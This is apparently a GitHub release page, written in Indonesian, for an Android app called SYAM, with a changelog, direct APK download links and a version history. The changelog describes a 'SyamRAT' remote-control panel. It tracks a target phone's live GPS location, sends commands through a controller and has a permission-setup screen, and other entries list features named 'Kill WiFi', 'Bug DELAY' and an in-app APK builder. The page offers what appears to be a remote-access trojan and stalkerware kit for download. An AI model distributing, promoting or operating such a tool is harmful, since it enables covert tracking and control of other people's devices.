# syam-apk-release

SYAM APK releases

## Versi Terbaru: v2.0.75 (22 September 2026)

**Size:** ~96.2 MB · **ABI:** arm (armeabi-v7a) + arm64 (arm64-v8a) · **Package:** com.syam.app

### Changelog v2.0.75

**Tema**
- Tema "SYAM 3D Comic" & Original dibenarkan: elemen yang sebelumnya tenggelam atau warnanya tidak kebaca di latar kertas (garis, tombol, label, warna peringatan) sekarang ikut token tema panel.
- Layout tema dirapikan di halaman pengaturan tema, panel SyamRAT, dan halaman Termux/hologram.

**SyamRAT**
- Layar Lokasi GPS dibenarkan total: error "The Google Maps Embed API must be used in an iframe" hilang — peta dibangun lewat iframe, default OpenStreetMap, plus chip pindah ke Google Maps.
- Lokasi realtime: perintah lokasi dikirim ulang tiap 15 detik, badge LIVE bisa di-tap, mati sendiri kalau HP tidak membalas 3x berturut.
- Tombol BUKA DI GOOGLE MAPS + RUTE NAVIGASI, kotak AKURASI / SUMBER / UPDATE, tata letak kartu peta + koordinat dirapikan ikut tema comic.
- Parser lokasi tahan banting (lat/latitude + lon/lng/longitude, angka maupun string, nested, tolak 0,0) + housekeeping timer.
- Kolom ketik perintah di controller tidak lagi tenggelam (mode command & chat), "session expired" tidak muncul lagi padahal sesi masih hidup.
- Layar izin/setup 3D: kartu 3D mendarat rata (tidak nyangkut miring), animasi terus-menerus dimatikan biar ringan di HP biasa.

**Engine & startup**
- Patch ABI Node (arm/arm64): mismatch ABI permanen tidak lagi memicu unduh ulang paket Node ~39 MB dan bootstrap berulang tiap start — kuota jauh lebih hemat.
- Dialog saat membuka app lewat antrian startup (izin notifikasi, tutorial, tawaran overlay, pengumuman suara) jadi tidak menumpuk di detik pertama.
- Cek update tidak lagi dobel jalan (landing + login + service): dibatasi 1x per 5 menit; error jaringan tidak lagi bikin dialog gagal.
- Banner notifikasi masuk di dashboard tidak lagi menumpuk beruntun.

Update ringan, tidak wajib.

### Download

- **GitHub (selalu versi terbaru):** https://github.com/yaitata01-ux/syam-apk-release/releases/latest/download/app-release.apk
- **GitHub (halaman rilis):** https://github.com/yaitata01-ux/syam-apk-release/releases
- **MediaFire (file):** https://www.mediafire.com/file/2s2x8sphfuzr8ex/SYAM-v2.0.75.apk/file
- **MediaFire (folder paten):** https://www.mediafire.com/folder/dcaoqpttmpkd0

### Riwayat

| Versi | Tanggal | Catatan |
|-------|---------|---------|
| v2.0.75 | 22 September 2026 | Tema & SyamRAT dibenarkan (peta lokasi, controller), patch ABI Node, antrian dialog startup, cek update anti-dobel |
| v2.0.74 | 21 Sep 2026 | Auto Modifikasi: APK hasil build didownload langsung di app + tombol Bagikan |
| v2.0.73 | 16 Sep 2026 | Bug DELAY lewat server, halaman welcome/SC, tema komik, perbaikan dashboard |
| v2.0.72 | 10 Sep 2026 | fixxed beberapa error apk (update wajib) |
| v2.0.50 | 11 Agu 2026 | Kill WiFi fix, fallback VPS fix, Bokep Streaming, GetContact fix, lag fix |
| v2.0.49 | 10 Agu 2026 | Fallback VPS, update notif non-wajib, ringankan aplikasi |
